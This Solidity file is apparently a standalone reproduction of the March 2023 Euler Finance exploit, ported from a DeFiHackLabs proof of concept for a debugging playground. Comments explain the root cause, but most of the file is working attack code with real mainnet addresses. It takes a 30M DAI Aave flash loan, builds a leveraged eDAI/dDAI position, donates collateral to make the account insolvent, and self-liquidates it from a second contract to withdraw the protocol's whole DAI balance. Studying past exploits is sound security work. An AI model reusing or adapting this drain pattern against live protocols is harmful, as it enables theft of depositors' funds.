// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-Euler).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `ContractTest` harness (`address(this)` is the attacker; the Aave V2 flash
// loan callback `executeOperation` lives on the test itself), and deploys two
// helper contracts `Iviolator`/`Iliquidator` via `new` mid-callback so the
// attack has two distinct Euler accounts to work with. Euler forbids
// self-liquidation even across sub-accounts of the SAME primary address
// (`require(!isSubAccountOf(violator, liquidator))` in Liquidation.sol), so
// two genuinely separate contract addresses are required — this file keeps
// that two-contract structure, copied verbatim from test/Euler_exp.sol.
//
// Root cause (Euler Finance, $197M, March 13 2023): EToken.donateToReserves()
// burns the CALLER's own eToken collateral and credits it to the protocol
// reserve pool WITHOUT touching the caller's paired dToken debt. This breaks
// the invariant that collateral (eToken) always covers debt (dToken). Because
// Euler's liquidate() also permitted `underlying == collateral`
// (self-liquidation across two different top-level addresses), an attacker
// can: (1) build a large, barely-solvent eDAI/dDAI position in a "violator"
// account, (2) donate away enough eDAI to flip the account insolvent while
// its debt is untouched, then (3) liquidate the violator from a second
// "liquidator" account it also controls, receiving a huge eDAI "discount"
// yield that is redeemable for real DAI deposited by honest users. The
// corrupted accounting lets `withdraw()` drain the protocol's actual DAI
// reserves.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface EToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IEuler {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 minYield
    ) external;
    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// Entry point: this contract plays the role of the DeFiHackLabs `ContractTest`
// (attacker EOA equivalent). It takes the Aave V2 flash loan and, in the
// callback, deploys the violator + liquidator helpers and drives the attack.
// Every step below is faithfully anchored on THIS contract's own call sites
// (the calls into the helpers), since the helpers are separately-deployed
// bytecode without their own verified/matched source in this debugger.
contract EulerDrain {
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IAaveFlashloan constant AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    Iviolator public violator;
    Iliquidator public liquidator;

    // step 0: flash-loan 30M DAI from Aave V2. The callback below runs the
    // full violator/liquidator sequence and repays the loan before returning.
    function run() external {
        uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        bytes memory params = "";
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);
    }

    function executeOperation(
        address[] calldata, /* assets */
        uint256[] calldata, /* amounts */
        uint256[] calldata, /* premiums */
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        DAI.approve(address(AaveV2), type(uint256).max);
        violator = new Iviolator();
        liquidator = new Iliquidator();
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        // Builds a barely-solvent eDAI/dDAI position, then donates away 100M
        // eDAI so the violator flips insolvent (eDAI < dDAI) — debt untouched.
        violator.violator();
        // Self-liquidates the violator from a second attacker-controlled
        // account, then withdraws Euler's entire real DAI reserve and
        // forwards it back here.
        liquidator.liquidate(address(liquidator), address(violator));
        return true;
    }
}

// Copied verbatim from test/Euler_exp.sol: builds a barely-solvent eDAI/dDAI
// position, then donates away enough eDAI to flip the account insolvent
// (eDAI < dDAI) WITHOUT touching the paired debt — the core Euler bug.
contract Iviolator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function violator() external {
        DAI.approve(Euler_Protocol, type(uint256).max);
        eDAI.deposit(0, 20_000_000 * 1e18);
        eDAI.mint(0, 200_000_000 * 1e18);
        dDAI.repay(0, 10_000_000 * 1e18);
        eDAI.mint(0, 200_000_000 * 1e18);
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
    }
}

// Copied verbatim from test/Euler_exp.sol: self-liquidates the now-insolvent
// violator (underlying == collateral == DAI is permitted), then withdraws
// ALL of Euler's real DAI reserves using the phantom eDAI "discount" yield.
contract Iliquidator {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function liquidate(address liquidator_, address violator_) external {
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(liquidator_, violator_, address(DAI), address(DAI));
        Euler.liquidate(violator_, address(DAI), address(DAI), returnData.repay, returnData.yield);
        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
